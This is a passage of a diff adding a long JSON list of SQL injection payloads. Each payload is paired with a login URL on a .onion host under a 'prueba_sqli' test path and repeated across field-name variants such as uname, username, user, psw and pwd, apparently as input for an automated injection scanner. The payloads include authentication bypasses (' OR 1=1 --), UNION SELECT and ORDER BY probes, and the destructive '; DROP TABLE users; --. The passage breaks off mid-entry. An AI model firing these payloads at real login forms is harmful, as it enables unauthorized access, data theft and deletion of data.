+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; SELECT * FROM users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "ORDER BY 1--",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; DROP TABLE users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 1=1 -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a\" -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 'a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; DROP TABLE users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT 1,2,3 --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; SELECT * FROM users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "ORDER BY 1--",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 'a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 1=1 -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; DROP TABLE users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a\" -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT 1,2,3 --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; SELECT * FROM users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "ORDER BY 1--",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 'a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 1=1 -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a\" -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; SELECT * FROM users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT 1,2,3 --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "'; DROP TABLE users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "ORDER BY 1--",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 1=1 -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 'a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a\" -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT 1,2,3 --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; SELECT * FROM users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; DROP TABLE users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 1=1 -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "ORDER BY 1--",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 'a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a\" -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; SELECT * FROM users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT 1,2,3 --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; DROP TABLE users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "ORDER BY 1--",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 1=1 -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 'a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; SELECT * FROM users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; DROP TABLE users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a\" -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 1=1 -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT 1,2,3 --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "ORDER BY 1--",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "' OR 'a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "\" OR \"a\"=\"a\" -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; DROP TABLE users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT 1,2,3 --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "ORDER BY 1--",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "'; SELECT * FROM users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "username": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 1=1 -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 'a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a\" -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; SELECT * FROM users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; DROP TABLE users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT 1,2,3 --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 1=1 -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "ORDER BY 1--",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a\" -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 'a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; DROP TABLE users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "ORDER BY 1--",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "'; SELECT * FROM users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "UNION SELECT 1,2,3 --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "\" OR \"a\"=\"a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "user": "' OR 'a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
